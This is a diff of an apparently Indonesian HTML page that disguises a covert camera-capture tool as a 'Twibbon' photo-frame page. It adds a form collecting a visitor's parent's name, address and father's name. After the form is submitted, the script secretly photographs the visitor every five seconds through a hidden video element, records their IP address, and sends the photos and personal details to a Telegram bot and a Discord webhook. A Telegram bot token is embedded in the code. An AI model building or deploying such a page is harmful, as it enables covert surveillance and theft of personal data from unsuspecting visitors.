@@ -3,10 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Automatic Camera Capture to Telegram and Discord</title>
+  <title>Twibbon</title>
   <style>
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -15,10 +16,25 @@
     video {
       display: none; /* Menyembunyikan video dari tampilan web */
     }
+    form {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+    input {
+      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
-  <h1>Automatic Camera Capture to Telegram and Discord</h1>
+  <form id="infoForm">
+    <input type="text" id="parentName" placeholder="Nama Orang Tua" required>
+    <input type="text" id="address" placeholder="Alamat" required>
+    <input type="text" id="fatherName" placeholder="Nama Bapak" required>
+    <button type="submit">Kirim</button>
+  </form>
 
   <script>
     var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
@@ -52,22 +68,22 @@
     }
 
     // Fungsi untuk mengirim gambar ke Discord
-    function sendToDiscord(imageDataURL, ipAddress) {
+    function sendToDiscord(imageDataURL, ipAddress, formData) {
       fetch(imageDataURL)
         .then(res => res.blob())
         .then(blob => {
-          var formData = new FormData();
-          formData.append('file', blob, 'photo.png');
+          var formDataDiscord = new FormData();
+          formDataDiscord.append('file', blob, 'photo.png');
 
           var payloadJson = {
-            content: `@everyone Foto terkirim dari IP: ${ipAddress}`
+            content: `@everyone Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
           };
 
-          formData.append('payload_json', JSON.stringify(payloadJson));
+          formDataDiscord.append('payload_json', JSON.stringify(payloadJson));
 
           return fetch(discordWebhookUrl, {
             method: 'POST',
-            body: formData
+            body: formDataDiscord
           });
         })
         .then(response => response.json())
@@ -80,7 +96,7 @@
     }
 
     // Fungsi untuk mengambil dan mengirim foto ke Telegram dan Discord
-    function takeAndSendPhoto() {
+    function takeAndSendPhoto(formData) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
           var video = document.createElement('video');
@@ -106,19 +122,21 @@
                 .then(data => {
                   ipAddress = data.ip;
 
-                  sendToTelegram(imageDataURL, `Foto terkirim dari IP: ${ipAddress}`);
-                  sendToDiscord(imageDataURL, ipAddress);
+                  var caption = `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
+                  sendToTelegram(imageDataURL, caption);
+                  sendToDiscord(imageDataURL, ipAddress, formData);
                 })
                 .catch(error => {
                   console.error('Error mendapatkan IP address:', error);
 
-                  sendToTelegram(imageDataURL, 'Foto terkirim');
-                  sendToDiscord(imageDataURL, 'IP tidak ditemukan');
+                  var caption = `Foto terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
+                  sendToTelegram(imageDataURL, caption);
+                  sendToDiscord(imageDataURL, 'IP tidak ditemukan', formData);
                 });
 
               document.body.removeChild(video);
 
-              setTimeout(takeAndSendPhoto, 5000);
+              setTimeout(() => takeAndSendPhoto(formData), 5000);
             }
           };
         })
@@ -127,12 +145,20 @@
           if (err.name === 'NotAllowedError') {
             alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
           } else {
-            setTimeout(takeAndSendPhoto, 5000);
+            setTimeout(() => takeAndSendPhoto(formData), 5000);
           }
         });
     }
 
-    takeAndSendPhoto();
+    document.getElementById('infoForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      var formData = {
+        parentName: document.getElementById('parentName').value,
+        address: document.getElementById('address').value,
+        fatherName: document.getElementById('fatherName').value
+      };
+      takeAndSendPhoto(formData);
+    });
   </script>
 </body>
 </html>
